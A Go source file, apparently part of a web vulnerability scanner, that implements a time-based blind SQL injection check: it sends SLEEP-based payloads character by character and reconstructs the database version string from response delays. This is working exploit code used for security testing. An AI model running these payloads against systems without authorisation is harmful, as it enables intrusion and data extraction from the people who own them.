package detection

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/autonomouspen/scanner/internal/common"
	"github.com/autonomouspen/scanner/internal/httpclient"
	"github.com/autonomouspen/scanner/internal/scannerutil"
)

type BlindEngine struct {
	client *httpclient.Client
}

func NewBlindEngine(client *httpclient.Client) *BlindEngine {
	return &BlindEngine{
		client: client,
	}
}

func (e *BlindEngine) Name() string {
	return "Blind SQLi"
}

func (e *BlindEngine) Detect(target string, param common.InjectionPoint, scanner interface{}, ctx context.Context) (*common.Finding, error) {
	version := ""

	for i := 1; i <= 20; i++ {
		found := false
		for c := 32; c <= 126; c++ {
			payload := fmt.Sprintf("' AND SUBSTRING(@@version,%d,1)='%s' AND SLEEP(1)--", i, string(c))
			injected := param.WithInjection(payload)
			startTime := time.Now()
			_, _, err := e.client.SendVerboseRequest(injected)
			if err != nil {
				continue
			}
			elapsedTime := time.Since(startTime)

			if elapsedTime > 1*time.Second {
				version += string(c)
				found = true
				break
			}
		}
		if !found {
			break
		}
	}

	if version != "" {
		return &common.Finding{
			URL:        target,
			Parameter:  param.Name,
			Type:       e.Name(),
			Evidence:   "Leaked version: " + version,
			Severity:   "High",
			Confidence: "High",
			Timestamp:  time.Now(),
			Request:    fmt.Sprintf("%+v", param),
			Response:   scannerutil.TruncateBody(""),
		}, nil
	}

	return nil, nil
}
